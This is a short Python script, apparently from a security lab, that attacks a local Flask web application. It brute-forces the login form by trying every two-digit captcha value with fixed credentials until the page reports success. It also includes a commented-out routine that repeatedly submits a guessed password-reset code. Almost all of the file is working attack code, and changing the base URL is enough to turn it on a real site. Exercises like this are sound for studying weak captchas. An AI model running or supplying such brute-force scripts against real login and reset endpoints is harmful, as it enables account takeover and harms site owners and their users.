import requests
import itertools

# Replace these values with your actual Flask application URL
BASE_URL = "http://localhost:3000"

# Function to generate all possible two-digit captchas without repetition
def generate_all_captchas():
    return [f"{i:02d}" for i in range(10, 100)]

# Function to simulate login attempts with all possible captchas
def brute_force_login(username, password, num_attempts):
    login_url = f"{BASE_URL}/login"
    all_captchas = generate_all_captchas()

    if num_attempts > len(all_captchas):
        print("Number of attempts exceeds the total number of captchas.")
        num_attempts = len(all_captchas)

    for captcha in all_captchas[:num_attempts]:
        data = {
            "username": username,
            "password": password,
            "captcha": captcha
        }
        response = requests.post(login_url, data=data)

        # Check if the response indicates a successful login
        if "Login successful!" in response.text:
            print(f"Successful login with captcha: {captcha}")
            break

        print(response.text)

# Function to simulate exploiting forget password feature
def exploit_forget_password(username):
    forget_password_url = f"{BASE_URL}/forget_password"
    data = {
        "username": username,
        "code": "123456"  # Replace with the actual code you want to use
    }
    for _ in range(5):  # Simulate multiple attempts within 2 minutes
        response = requests.post(forget_password_url, data=data)
        print(response.text)

# Replace these values with your actual credentials
USERNAME = "user1"
PASSWORD = "password1"

# Simulate login attempt with all possible captchas (up to 89 attempts)
brute_force_login(USERNAME, PASSWORD, 89)

# Simulate exploiting forget password feature
#exploit_forget_password(USERNAME)
